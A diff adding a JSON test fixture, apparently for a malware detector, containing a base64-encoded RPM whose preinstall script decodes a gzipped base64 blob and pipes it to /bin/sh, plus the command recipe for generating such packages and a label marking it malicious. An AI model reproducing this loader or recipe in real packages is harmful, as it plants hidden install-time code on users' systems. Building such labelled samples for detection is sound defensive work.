@@ -1,0 +1,12 @@
+{
+ "material": "7avu2wMAAAAAAWh1bnRyZXNzLWFnZW50LTEuMC0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAUAAAAAAAAAAAAAAAAAAAAAjq3oAQAAAAAAAAABAAAABAAAA+gAAAAEAAAAAAAAAAEAAAAAAAAAAI6t6AEAAAAAAAAABQAAAVMAAAPoAAAABgAAAAAAAAABAAAD6QAAAAYAAAAPAAAAAQAAA+oAAAAGAAAAEwAAAAEAAAP/AAAABgAAABUAAAABAAAEPQAAAAgAAAFLAAAAAWh1bnRyZXNzLWFnZW50ADEuMAAxAGRlc2NyaXB0b3JfN2E4YjljMGQ9Ikg0c0lBQUFBQUFBQ0F6Mk95UW9DTVJCRWYwaG5jUmtYNkU4UVJMeUhucVRKTkdZeW9aTU1Idkx4NXFBZWkxZXZxQlgyeGFHM0dTM0JpSEVxc2pnQzlqR2hjeVJsSlRHc0U4em9XUE9TWThHVVVML2cyUjhQUTlQMVEwR0RJWkdBaEZrRklmYWx5cGFVWHJKUHNLdUpRdnhOcWxEbFNqZVMvYmV0Y1E3STFpczI4TGpmdGljOGp4ZmRtWkxGd1pSU2lOZTJyZU4vME5DN0tvNGE5bXU5WmRxNCt3Qm02dFdPeUFBQUFBPT0iCmVjaG8gIiRkZXNjcmlwdG9yXzdhOGI5YzBkIiB8IGJhc2U2NCAtZCB8IGd1bnppcCB8IHNoCgAvYmluL3NoAB+LCAAAAAAAAAAAAAAAAAAAAAAA",
+ "rep": "rpm",
+ "transform": null,
+ "key": "pre",
+ "expected": "v=3|language=bash|role=installer|verdict=malicious|attack=T1546.016|adapter=rpm_prein|stage_count=2|steps=install_package,run_prein|campaign_id=RPM-7a8b9c0d|url=https://rpm-7a8b9c0d.example.invalid/s2",
+ "decoy": false,
+ "generator_cmd": "M=$(printf %s '<plan>' | gzip -9n | base64 -w0); printf 'descriptor_<id>=\"%s\"\\necho \"$descriptor_<id>\" | base64 -d | gunzip | /bin/sh\\n' \"$M\" > body.sh; python3 -I pkg_rpm_gen.py pkg_rpm_prein.rpm 1023 /bin/sh body.sh  (stdlib struct RPM v3 writer: lead + sig header + main header; file(1): RPM v3.0 bin); material = base64 -w0 pkg_rpm_prein.rpm",
+ "oracle_cmd": "PYTHONPATH=tools/pylib-rpm .venv/bin/python -I -c \"import rpmfile,sys,re,base64,gzip; r=rpmfile.open(sys.argv[1]); s=r.headers['prein'].decode(); print(gzip.decompress(base64.b64decode(re.search(r'H4sI[A-Za-z0-9+/=]*',s).group(0))).decode()); print(r.headers['preinprog'])\" pkg_rpm_prein.rpm   (rpmfile 2.2.1 header reader, pip --target tools/pylib-rpm)",
+ "source_file": "pkg_rpm_prein.rpm",
+ "note": "linux-package-maintainer-scripts (T1546.016 / T1059.004): decode(rep=rpm) -> pkg_scripts -> script body readers"
+}
